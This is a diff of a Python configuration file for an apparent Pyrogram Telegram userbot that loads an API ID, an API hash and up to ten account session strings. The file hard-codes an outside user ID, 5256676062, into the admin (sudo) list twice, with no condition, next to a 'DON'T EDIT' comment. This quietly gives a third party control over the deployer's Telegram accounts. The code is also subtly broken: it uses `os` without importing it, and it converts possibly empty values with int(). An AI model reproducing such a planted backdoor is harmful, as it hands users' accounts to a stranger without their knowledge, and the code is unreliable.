@@ -1,22 +1,44 @@
 
 
+import re
+import sys
+from os import getenv
+
+from dotenv import load_dotenv
+from pyrogram import filters
+
+load_dotenv()
 
 
 
 
+API_ID = int(getenv("API_ID", ""))
+API_HASH = getenv("API_HASH")
+ALIVE_PIC = getenv("ALIVE_PIC", None)
 
-API_ID = config("API_ID", default=None, cast=int)
-API_HASH = config("API_HASH", default=None)
-ALIVE_PIC = config("ALIVE_PIC", default=None)
+#CLIENT SESSION
+
+STRING1 = getenv("STRING_SESSION1", None)
+STRING2 = getenv("STRING_SESSION2", None)
+STRING3 = getenv("STRING_SESSION3", None)
+STRING4 = getenv("STRING_SESSION4", None)
+STRING5 = getenv("STRING_SESSION5", None)
+STRING6 = getenv("STRING_SESSION6", None)
+STRING7 = getenv("STRING_SESSION7", None)
+STRING8 = getenv("STRING_SESSION8", None)
+STRING9 = getenv("STRING_SESSION9", None)
+STRING10 = getenv("STRING_SESSION10", None)
+OWNER_ID = int(os.environ.get("OWNER_ID", None))
+
+
+# USERBOT ADMINS AND OWNER
+
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 if 5256676062 not in SUDO_USERS: 
     SUDO_USERS.append(5256676062)
 
-OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 #DON'T EDIT OR MESS WITH CODES
-
-
 
 SUDO_USERS.append(OWNER_ID)
 SUDO_USERS.append(5256676062)
